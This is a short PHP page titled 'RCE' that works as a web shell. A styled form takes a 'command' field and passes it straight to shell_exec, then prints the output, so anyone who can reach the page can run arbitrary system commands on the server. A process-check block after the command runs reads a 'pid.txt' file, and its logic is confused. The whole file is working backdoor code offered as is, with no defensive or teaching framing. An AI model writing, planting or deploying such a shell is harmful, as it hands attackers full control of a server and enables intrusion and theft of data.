<!DOCTYPE html>
<html>
<head>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            width: 300px;
            min-width: fit-content;
        }
        input[type="text"],
        input[type="submit"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }
        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            cursor: pointer;
        }
        pre {
            background-color: #eee;
            padding: 10px;
            border-radius: 5px;
            overflow: auto;
        }

    </style>
    <title>RCE</title>
</head>
<body>
    <div class="container">
        <form method="post">
            <input type="text" name="command" placeholder="Enter command">
            <input type="submit" value="Run">
        </form>
        <?php
        if(isset($_POST['command'])){
            echo "<pre>" . shell_exec($_POST['command']) . "</pre>";
            // Get the PID of the command if it's running
            $pid = file_get_contents('pid.txt');
            if ($pid !== false) {
                // Check if the process with this PID is still running
                if (posix_getpgid($pid) !== false) {
                    echo "Command is already running";
                    return;
                }
            }
        }
            ?>
    </div>
</body>
</html>